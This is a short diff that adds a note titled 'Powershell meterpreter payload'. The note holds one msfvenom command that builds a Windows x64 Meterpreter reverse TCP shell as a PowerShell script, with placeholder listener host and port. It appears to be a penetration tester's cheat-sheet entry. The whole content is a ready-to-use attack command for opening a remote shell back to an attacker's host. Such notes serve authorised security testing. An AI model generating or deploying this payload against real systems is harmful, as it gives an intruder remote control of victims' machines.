@@ -1,0 +1,5 @@
+# Powershell meterpreter payload
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
+
+
